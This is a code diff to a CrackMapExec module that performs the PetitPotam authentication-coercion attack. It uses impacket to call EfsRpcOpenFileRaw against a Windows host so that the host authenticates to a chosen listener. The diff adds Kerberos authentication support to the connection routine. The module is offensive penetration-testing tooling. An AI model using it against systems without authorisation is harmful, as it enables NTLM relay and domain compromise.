@@ -9,7 +9,7 @@ from impacket import system_errors
 from impacket.dcerpc.v5 import transport
 from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
 from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR
-from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
 from impacket.uuid import uuidtup_to_bin
 
 class CMEModule:
@@ -35,7 +35,7 @@ class CMEModule:
 
     def on_login(self, context, connection):
         plop = CoerceAuth()
-        dce = plop.connect(connection.username, password=connection.password, domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, target=connection.host, pipe=self.pipe, targetIp=connection.host)
+        dce = plop.connect(connection.username, password=connection.password, domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, target=connection.host, pipe=self.pipe, targetIp=connection.host, doKerberos=connection.kerberos, dcHost=connection.kdcHost)
         if plop.EfsRpcOpenFileRaw(dce, self.listener):
             context.log.highlight("VULNERABLE")
             context.log.highlight("Next step: https://github.com/topotam/PetitPotam")
@@ -158,7 +158,7 @@ class EfsRpcEncryptFileSrvResponse(NDRCALL):
     )
 
 class CoerceAuth():
-    def connect(self, username, password, domain, lmhash, nthash, target, pipe, targetIp):
+    def connect(self, username, password, domain, lmhash, nthash, target, pipe, targetIp, doKerberos, dcHost):
         binding_params = {
             'lsarpc': {
                 'stringBinding': r'ncacn_np:%s[\PIPE\lsarpc]' % target,
@@ -191,6 +191,11 @@ class CoerceAuth():
         dce = rpctransport.get_dce_rpc()
         dce.set_auth_type(RPC_C_AUTHN_WINNT)
         dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+
+        if doKerberos:
+            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
+            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+
         logging.debug("[-] Connecting to %s" % binding_params[pipe]['stringBinding'])
         try:
             dce.connect()
